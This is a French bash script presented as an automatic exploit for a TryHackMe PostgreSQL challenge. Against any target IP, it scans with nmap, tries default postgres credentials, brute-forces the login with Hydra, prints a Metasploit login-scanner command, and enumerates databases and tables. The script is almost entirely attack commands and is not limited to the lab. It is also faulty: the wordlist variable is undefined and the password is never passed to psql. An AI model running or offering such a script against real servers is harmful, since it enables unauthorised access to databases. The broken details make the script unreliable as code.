#!/bin/bash
# Exploit automatique TryHackMe - Elephant SQL (PostgreSQL)

TARGET_IP="$1"
PORT=5432
USER="postgres"
PASS="postgres"

# 1. Scan Nmap
nmap -p $PORT -A $TARGET_IP -oN nmap_postgres.txt

# 2. Test connexion avec psql
echo "[+] Scan Nmap du service PostgreSQL..."
echo "[+] Détection du service et version :"
grep 'PostgreSQL' nmap_postgres.txt
echo "[+] Tentative de connexion avec psql (identifiants par défaut)..."
psql -h $TARGET_IP -p $PORT -U $USER -c '\l' 2>&1 | tee psql_test.txt

if grep -q 'FATAL' psql_test.txt; then
	echo "[-] Connexion échouée. Lancement du bruteforce avec Hydra..."
	hydra -l $USER -P $WORDLIST -s $PORT $TARGET_IP postgres
else
	echo "[+] Connexion réussie à PostgreSQL avec $USER:$PASS"
fi

# 3. Exploitation Metasploit
echo "[+] Exploitation Metasploit (manuel) :"
echo "msfconsole -q -x 'use auxiliary/scanner/postgres/postgres_login; set RHOSTS $TARGET_IP; set USERNAME $USER; set PASSWORD $PASS; run; exit'"

# 4. Extraction de données
echo "[+] Extraction de données :"
psql -h $TARGET_IP -p $PORT -U $USER -c "SELECT datname FROM pg_database;"

# 5. Astuces
echo "[+] Recherche de flag ou d'informations sensibles :"
psql -h $TARGET_IP -p $PORT -U $USER -c "SELECT * FROM information_schema.tables;"
echo "[+] Astuces :"
echo "- Tester d'autres identifiants (admin, user, etc.)"
echo "- Adapter les modules Metasploit selon la version du service"
echo "- Vérifier les permissions et les bases accessibles"

# Fin du script
echo "[+] Fin du script. Pensez à adapter les commandes selon le contexte du challenge."
